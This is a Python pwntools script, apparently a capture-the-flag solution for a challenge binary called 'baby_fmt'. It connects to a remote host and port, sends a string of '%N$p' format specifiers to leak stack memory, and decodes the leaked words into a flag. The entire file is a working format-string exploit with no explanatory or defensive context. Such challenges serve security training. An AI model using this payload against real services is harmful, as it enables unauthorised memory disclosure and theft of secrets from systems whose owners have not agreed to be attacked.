#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft
import pwnlib

debug =  False

c = 0
pwn_file = "./baby_fmt"
elf = ELF(pwn_file)
if debug:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 4001)
 
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

"""
if debug:
    gdbcmd = '''
    vmmap
    c
    ''' 

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

"""

payload = ''
for i in range(0,10):
    payload += '%{}$p'.format(6 + i)

c.sendline(payload)
c.recvline()
c.recvuntil('You said:')

flag = c.recvline().split(b'(nil)')[0].split(b'0x')[1:]

print(flag)
ans = b''
for i in flag:
    ans += p64(int(i.decode(), 16))

print(ans)
